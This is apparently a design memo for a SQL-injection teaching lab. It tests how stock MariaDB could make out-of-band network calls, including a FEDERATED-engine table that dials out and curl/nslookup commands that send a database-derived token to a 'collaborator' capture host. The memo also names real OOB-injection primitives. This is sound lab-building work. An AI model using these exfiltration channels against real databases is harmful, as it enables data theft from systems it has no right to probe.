# OOB emitter spike — design decision for the next lesson

**Status:** decided. **Scope:** this memo is the only input the next task
(Phase 3 lesson content, `challenges/phase3.py`) should need to build the
actual "out-of-band confirmation" challenge on top of the `collaborator`
service. It records what was checked, what was found, and the mechanism to
build against.

## The question

Out-of-band (OOB) confirmation is the standard technique where a tester,
unable to see a query's result in the application's normal response, gets
the database (or the app acting on the database's behalf) to make a
*separate*, independent network call — carrying data pulled from the query
— to a diagnostic host the tester controls. The tester then reads the
confirmation off that separate channel instead of the app's own response.

The question this spike answers: **which stock, out-of-the-box MariaDB
capability** — no third-party plugins, no UDFs, must work against a vanilla
`mariadb:11` image — **can make a real, separate outbound network call**
(DNS or HTTP) to another host on the docker network, so the lab can
demonstrate this faithfully?

## What was checked, against a live stack

`mariadb` (image `mariadb:11`, version confirmed at `11.8.9-MariaDB`) and
the new `collaborator` service were brought up together on the compose
network and probed directly.

### 1. `LOAD_FILE()` with a UNC-style path (the classic textbook example)

The often-cited example of DB-triggered OOB is a Windows SQL Server/UNC
path (`\\host\share`) coaxing the OS into an SMB session that leaks a DNS
lookup of `host`. This is Windows-SMB-specific machinery, and it does
**not** carry over to Linux MariaDB — confirmed directly rather than
assumed:

```sql
SELECT @@secure_file_priv;                          -- NULL
SELECT LOAD_FILE('\\\\collaborator\\test');          -- NULL, no error
```

`secure_file_priv` is `NULL` on this image, which disables `LOAD_FILE`/
`... INTO OUTFILE`/`DUMPFILE` entirely regardless of path. But even setting
that aside, a Linux `LOAD_FILE()` call just treats a `\\host\share`-style
string as a literal (invalid) local path — Linux has no built-in SMB
client wired into `fopen()`-style file access the way Windows does, so
there is no DNS lookup, no network call, nothing. This textbook example is
Windows-only and does not apply here.

### 2. `SHOW ENGINES` / plugin sweep for anything stock capable of an outbound call

```
mariadb -uroot -p... -e "SHOW ENGINES;"
```

Default-enabled engines: `MEMORY, CSV, PERFORMANCE_SCHEMA, Aria, MyISAM,
MRG_MyISAM, InnoDB, SEQUENCE` — none of these touch the network.

Checking `plugin_dir` (`/usr/lib/mysql/plugin/`) for anything network-
capable that ships in the image but isn't loaded by default turned up
`ha_federated.so`, `ha_federatedx.so`, and `ha_blackhole.so`. `BLACKHOLE`
is a no-op/discard engine (writes vanish, no I/O of any kind) — not
relevant. `FEDERATED` **is** relevant: it's a stock storage engine (ships
in the official image, not a third-party install), just disabled by
default. Enabling it is a single in-database statement, no filesystem or
package changes:

```sql
INSTALL SONAME 'ha_federated';   -- succeeds; SHOW ENGINES now lists FEDERATED / ACTIVE
```

**This was tested for real, not assumed.** A `FEDERATED` table was created
pointing its `CONNECTION` string at the `collaborator` service:

```sql
CREATE TABLE oobtest.fed_test (id INT) ENGINE=FEDERATED
  CONNECTION='mysql://seiyaku:seiyaku_pw@collaborator:80/seiyaku/floors';
SELECT * FROM oobtest.fed_test;   -- issued from the mariadb client
```

Querying the table made MariaDB genuinely dial out: `collaborator`'s HTTP
listener accepted a real TCP connection from the `mariadb` container and
then errored out (`ConnectionResetError` while trying to read an HTTP
request line — MariaDB's client was waiting for a MySQL handshake packet
instead of speaking HTTP), and the `mariadb` client itself blocked until
the surrounding shell's timeout killed it. That confirms the round trip is
real: an actual TCP connection, initiated from inside the MariaDB process,
crossed the docker network to another container.

**Why this isn't usable as the lesson's actual injection trigger, despite
being real:**

- It speaks the MySQL wire protocol only. To turn that connection attempt
  into a clean, parseable capture, `collaborator` would need to *be* a
  MySQL-protocol listener, not the HTTP/DNS listener the rest of this
  lab's capture UX (and `/captures` shape) is built around.
- The outbound target (host/port/user/db in `CONNECTION=`) is fixed at
  `CREATE`/`ALTER TABLE` time — that's DDL, not something a read-only
  injected `SELECT` can parameterize with a value pulled from a query
  result. There's no clean way to make the destination hostname/path
  *carry exfiltrated data* through the kind of single-statement
  boolean-blind/UNION-based injection the rest of this lab's floors use.
- `INSTALL SONAME` is a privileged, DBA-level bootstrap step that has to
  happen before any of this works — not something an injection at
  application-user privilege could trigger itself.

Net finding: **FEDERATED proves a vanilla Linux MariaDB process can make a
real outbound network call, but not in a shape a SQL-injection lesson can
practically drive.** No other stock, default-installable engine or plugin
in this image (no `CONNECT`, no `SPIDER` — neither ships in this image,
and both would count as extra, non-stock components anyway) offers
anything closer.

## Decision

**The next lesson's OOB-confirmation mechanism lives at the Flask
application layer, not inside MariaDB.** The pattern: a challenge route
reads a value back from a MariaDB query (via `core.db.mysql_conn()`), and
the *application code* — not the database — relays that value onward as a
real, separate outbound network request to the `collaborator` service
(an HTTP call to `collaborator` carrying the value in the path/query/
header, and/or a DNS lookup of a hostname built from the value, e.g.
`<value>.collaborator`). The tester never sees this value in the
challenge's own HTTP response; they read it out of `collaborator`'s
`GET /captures` instead — the same tester-visible confirmation UX a
genuine DB-native OOB primitive would produce.

This is a well-known, commonly-documented simplification for self-
contained teaching labs: it keeps the core teaching property intact
without requiring an unstable third-party database extension.

## What's genuinely real vs. what's modeled

**Genuinely real:** the network hop from the app process to `collaborator`
is an actual, independent HTTP/DNS round trip over the docker network —
`collaborator` observes it as a real incoming connection carrying real
data, entirely separate from the challenge's own HTTP response, and a
tester reads the confirmation off `/captures` with no cooperation from the
in-process request/response cycle (nothing is faked, logged in-process, or
short-circuited — it is a genuine second network request, verified live in
this spike). **What's simplified:** in a real-world OOB-SQLi scenario, the
*component that decides to make that network call* is normally something
invoked directly by the injected SQL itself (a DB-native extension/UDF —
an `xp_dirtree`-style call, `UTL_HTTP`, a working `dblink`/`FEDERATED`
setup, etc.) with no application code involved at all; here, that
triggering role is played by the Flask application layer instead, because
a stock, stable, Linux-vanilla-MariaDB-native equivalent was not found (see
above). The lesson content built on this decision should be honest with
students about that boundary: the data really did travel out-of-band and
really was confirmed on a channel independent of the app's response, but
the specific hop that decided to phone home lives in this lab's
application code rather than inside MariaDB.

## Collaborator service recap (for the next task's reference)

- `collaborator/collaborator.py` — stdlib-only, single process:
  - HTTP capture server on port 80: logs every request (method, path,
    query string, headers, body, client IP, timestamp) to an in-memory,
    size-bounded (`deque(maxlen=500)`) list. `GET /captures` is
    special-cased — it returns the capture list as JSON instead of being
    logged as a capture itself.
  - DNS capture server on UDP port 53: parses just enough of RFC 1035 to
    log the queried name + type, then replies **NOERROR** — an A record
    (`127.0.0.1`, TTL 60) for `A` queries, an empty-answer NOERROR for
    anything else. NOERROR (not NXDOMAIN) was chosen so a real resolver's
    lookup completes promptly instead of retrying/falling back to another
    nameserver — this is a lab, and the point is observing the query land
    quickly, not modeling authoritative DNS correctly.
  - `GET /captures` returns a JSON array, **newest first**, mixing both
    capture types, distinguished by a `"type": "http"` / `"type": "dns"`
    field. See the verification output below for the exact shape.
- `collaborator/Dockerfile` — `python:3.12-slim`, no dependencies, runs as
  root only because ports 80/53 are privileged.
- `docker-compose.yml`'s `collaborator` service now builds this image and
  `expose`s `80` and `53/udp` on the internal compose network only (no
  published host ports) — only reachable by other containers via the
  service name `collaborator`.

## End-to-end verification (this spike)

With only `mariadb` and `collaborator` up:

```bash
# 1. A value read back from a real MariaDB query (stand-in for whatever a
#    Phase-3 challenge route will pull out of a DB query result):
TOKEN=$(docker exec seiyaku-arc-mariadb-1 mariadb -uroot -pseiyaku_root_pw \
  -N -e "SELECT MD5(CONCAT('oob-demo-', NOW()));")
# => f17d1d1b23bdc389324e108290a068ec

# 2. The app-layer relay: a real, separate outbound HTTP call to
#    collaborator carrying that value (modeling what a Phase-3 route does):
docker run --rm --network seiyaku-arc_default curlimages/curl:8.10.1 \
  -s -o /dev/null -w "HTTP status: %{http_code}\n" \
  "http://collaborator/oob-confirm/$TOKEN"
# => HTTP status: 200

# 2b. DNS side exercised too, for completeness:
docker run --rm --network seiyaku-arc_default curlimages/curl:8.10.1 \
  sh -c "nslookup confirm-$TOKEN.collaborator collaborator"
# => Address: 127.0.0.1 (NOERROR)

# 3. Poll /captures and confirm the token landed, independent of any
#    challenge response:
docker run --rm --network seiyaku-arc_default curlimages/curl:8.10.1 \
  -s "http://collaborator/captures"
```

Resulting `/captures` (newest first, truncated to the three entries this
test produced):

```json
[
  {
    "type": "dns", "qname": "confirm-f17d1d1b23bdc389324e108290a068ec.collaborator",
    "qtype": "AAAA", "client_ip": "172.19.0.4",
    "timestamp": "2026-09-06T18:15:18.164410+00:00"
  },
  {
    "type": "dns", "qname": "confirm-f17d1d1b23bdc389324e108290a068ec.collaborator",
    "qtype": "A", "client_ip": "172.19.0.4",
    "timestamp": "2026-09-06T18:15:18.164261+00:00"
  },
  {
    "type": "http", "method": "GET",
    "path": "/oob-confirm/f17d1d1b23bdc389324e108290a068ec",
    "headers": {"Host": "collaborator", "User-Agent": "curl/8.10.1", "Accept": "*/*"},
    "body": "", "query": {}, "raw_query": "",
    "client_ip": "172.19.0.4",
    "timestamp": "2026-09-06T18:15:17.919952+00:00"
  }
]
```

The value read from MariaDB (`f17d1...`) landed in both the HTTP path and
the DNS query name, confirming the mechanism end-to-end and confirming
`/captures` surfaces it in the shape a polling UI needs.

## Open questions for the next task (Phase 3 lesson content)

- Whether the Phase-3 challenge(s) use the HTTP path, the DNS lookup, or
  both as the actual confirmation channel — this spike proved both work;
  the lesson design should pick based on which better fits the injection
  technique being taught (e.g., a DNS-lookup framing may read as more
  "classic OOB-SQLi" to students than an HTTP GET).
- Whether `/captures` needs a filter/query param (e.g. by a per-challenge
  token prefix) once real lesson traffic starts mixing with polling noise
  from multiple concurrent students — not needed for this spike's
  single-entry test, but worth considering before Phase 3 ships.
- The FEDERATED-engine finding above is recorded for completeness/honesty
  but deliberately **not** wired into any lesson — nothing in
  `docker-compose.yml`, seed SQL, or challenge code should depend on
  `INSTALL SONAME 'ha_federated'` being active; the test table and plugin
  were fully torn down (`DROP TABLE`, `DROP DATABASE`, `UNINSTALL SONAME`)
  before this spike finished, and `mariadb`'s `SHOW ENGINES` was confirmed
  clean again afterward.
